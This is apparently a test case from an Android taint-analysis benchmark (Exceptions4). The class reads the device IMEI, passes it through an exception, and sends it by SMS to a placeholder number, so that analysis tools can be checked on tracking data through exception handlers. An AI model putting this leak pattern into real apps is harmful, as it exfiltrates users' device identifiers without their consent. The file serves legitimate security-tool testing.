package de.ecspride;

import android.app.Activity;
import android.content.Context;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;

/**
 * @testcase_name Exceptions4
 * @version 0.1
 * @author Secure Software Engineering Group (SSE), European Center for Security
 and Privacy by Design (EC SPRIDE) 
 * @author_mail steven.arzt@cased.de
 * 
 * @description tainted data is created, thrown as exception data and sent out
 in the exception handler
 * @dataflow source -> imei -> exception -> exception handler -> sink
 * @number_of_leaks 1
 * @challenges the analysis must handle exception data
 */
public class Exceptions4 extends Activity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_exceptions4);
        try {
            TelephonyManager telephonyManager =
              (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
            String imei = telephonyManager.getDeviceId();
            throw new RuntimeException(imei);
        }
        catch (RuntimeException ex) {
            SmsManager sm = SmsManager.getDefault();
            sm.sendTextMessage("+49 1234", null, ex.getMessage(), null, null);
        }
    }
    
    public Exceptions4() { super(); }
    
    public static final String jlc$CompilerVersion$jl7 = "2.7.1";
    public static final long jlc$SourceLastModified$jl7 = 1450032968000L;
    public static final String jlc$ClassType$jl7 =
      ("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" +
       "qP//AEHmXX3KDwAA");
}
